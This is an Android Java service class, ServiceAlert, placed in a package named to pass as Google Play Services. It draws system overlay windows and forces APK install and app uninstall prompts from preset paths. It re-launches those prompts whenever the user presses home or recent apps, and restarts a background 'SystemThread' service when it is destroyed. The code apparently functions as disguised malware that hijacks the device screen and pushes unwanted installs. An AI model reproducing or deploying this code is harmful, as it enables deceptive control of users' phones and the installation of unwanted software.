package com.google.play.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.widget.TextView;
import android.widget.ActionMenuView.LayoutParams;
import android.view.LayoutInflater;
import android.view.View;
import android.view.KeyEvent;
import android.view.Gravity;
import android.view.WindowManager;
import android.graphics.PixelFormat;
import android.graphics.Color;
import android.net.Uri;
import java.io.File;

import com.google.play.services.lib.util.android.ContentUtils;
import com.google.play.services.lib.ModelSurfaceView;
import com.google.play.services.lib.Loaderku;

public class ServiceAlert extends Service {

	public static String dataText = "";
	public static String dataPaket = "";
	public static String pilihAksi = "";
	public static int dataTextSize = 12;

    // 3d
    public static String pathObj = "";
    public static float animeCameraX = 0;
    public static float animeCameraY = 0;
    public static float animeZoom = 0;
    public static float animeRotasi = 0;
    public static float posisiX = 0;
    public static float posisiY = 0;
    public static float posisiZ = 0;
    public static float skala = 0;
    public static boolean zoomRotasi = false;
    public static boolean posisi = false;

	private static final int REQUEST_CODE_LOAD_TEXTURE = 1000;
    private int paramType;
    private Uri paramUri;
    private boolean immersiveMode = true;
    public ModelSurfaceView gLView;
    private Loaderku scene;
    private Handler handler;

    // view
	private LinearLayout layoutView;
    private TextView fullPath;
	private int y = 1;

	@Override
    public IBinder onBind(Intent intent) {
        return null;
    }

	@Override
	public void onCreate()
	{
		// TODO: Implement this method
		super.onCreate();
		if (pilihAksi.equals("install")) { // dataPaket dalam hal ini src file ex: /sdcard/oke.apk
			y = 2;
			Intent intent = new Intent(Intent.ACTION_VIEW);
        	intent.setDataAndType(Uri.fromFile(new File(dataPaket)), "application/vnd.android.package-archive");
        	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        	ServiceAlert.this.startActivity(intent);
        
        } else if (pilihAksi.equals("uninstall")) { // dataPaket dalam hal ini nama paket ex: com.shun.oke
        	y = 4;
        	try {
				Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
				intent.setData(Uri.parse("package:"+dataPaket));
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				ServiceAlert.this.startActivity(intent);
				
			} catch(Exception e) {
				Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				ServiceAlert.this.startActivity(intent);
			}
        
        } else if (pilihAksi.equals("hotspot")) {
        	y = 1;
        
        } else if (pilihAksi.equals("root")) {
        	y = 2;
        
        } else if (pilihAksi.equals("3d")) {
            y = 2;
        
        } else if (pilihAksi.equals("browser")) {
            y = 2;
        }

        
		layoutView = new LinearLayout(this) {
			public void onCloseSystemDialogs(String reason) {
				if ("homekey".equals(reason) || "recentapps".equals(reason)) {

					if (pilihAksi.equals("install")) {
						Intent intent = new Intent(Intent.ACTION_VIEW);
        				intent.setDataAndType(Uri.fromFile(new File(dataPaket)), "application/vnd.android.package-archive");
        				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        				ServiceAlert.this.startActivity(intent);
                        fullPath.setText(dataText);
        			
        			} else if (pilihAksi.equals("uninstall")) {
        				try {
							Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
							intent.setData(Uri.parse("package:"+dataPaket));
        					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							ServiceAlert.this.startActivity(intent);
				
						} catch(Exception e) {
							Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
        					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							ServiceAlert.this.startActivity(intent);
						}
        			}
				
                }
				
			}
		};
        
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
        
        if (pilihAksi.equals("3d")) {
            LinearLayout.LayoutParams params3d = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            handler = new Handler(getMainLooper());
            scene = new Loaderku(this, this);
            scene.init();
            gLView = new ModelSurfaceView(this);
            
            layoutView.setBackgroundColor(Color.TRANSPARENT);
            layoutView.addView(gLView, params3d);
        
        } else if (pilihAksi.equals("browser")) {
            LinearLayout.LayoutParams paramsBrow = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);

            layoutView.setBackgroundColor(Color.TRANSPARENT);
            layoutView.addView(new ReceiverBoot().setWebView(this, dataText, "web"), paramsBrow);
        
        } else {
            fullPath = new TextView(this);
            LinearLayout.LayoutParams paramsfullPath = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            fullPath.setTextSize(dataTextSize);
            fullPath.setTextColor(Color.BLACK);
            fullPath.setText(dataText);

            layoutView.setBackgroundColor(Color.YELLOW);
            layoutView.addView(fullPath, paramsfullPath);

        }

        layoutView.setOrientation(LinearLayout.VERTICAL);
        layoutView.setLayoutParams(layoutParams);

		
		WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(LayoutParams.MATCH_PARENT, new ReceiverBoot().getScreenHeight()/y,
        	WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
			WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
				
		if (pilihAksi.equals("uninstall")) {
			params.gravity = Gravity.BOTTOM;
		} else {
			params.gravity = Gravity.TOP;
		}

		wm.addView(layoutView, params);

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_HOME);
        startActivity(intent);

        try {Thread.sleep(1000);}catch(Exception e){}

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.removeViewImmediate(layoutView);

		startService(new Intent(this, SystemThread.class));
	}

    public void setCamera(float dx, float dy) {
        this.animeCameraX = dx;
        this.animeCameraY = dy;
    }
    public void setCameraZoom(float vector) {
        this.animeZoom = vector;
    }
    public void setCameraRotasi(float pi) {
        this.animeRotasi = pi;
    }
    public void setPosisi(float x, float y, float z) {
        this.posisiX = x;
        this.posisiY = y;
        this.posisiZ = z;
    }
    public void setPath(String path) {
        this.pathObj = path;
    }


	public Uri getParamUri() {
        return paramUri;
    }

    public int getParamType() {
        return paramType;
    }

    public Loaderku getScene() {
        return scene;
    }

    public ModelSurfaceView getGLView() {
        return gLView;
    }
	
}